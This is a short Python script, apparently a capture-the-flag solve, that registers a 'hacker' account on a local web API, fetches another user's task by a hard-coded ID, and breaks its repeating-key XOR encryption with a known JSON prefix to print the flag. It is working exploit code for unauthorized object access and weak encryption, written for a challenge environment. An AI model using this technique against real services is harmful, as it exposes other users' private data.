import requests
from base64 import b64decode

url = "http://127.0.0.1:9998/api"
uid = "7cc6883e-09a0-4c57-ae69-8f1b0b78abfc"

s = requests.Session()

s.post(f"{url}/register/", json={
    "username": "hacker",
    "password": "hacker",
    "name": "hacker"
})

s.post(f"{url}/login/", json={
    "username": "hacker",
    "password": "hacker"
})

data = b64decode(s.get(f"{url}/tasks/{uid}/").json()['data'])

template = b'{"description":"'
key = []

for i in range(len(template)):
    key.append(data[i] ^ template[i])

flag = ""

for i in range(len(data)):
    flag += chr(data[i] ^ key[i % len(key)])

print(flag, flush=True)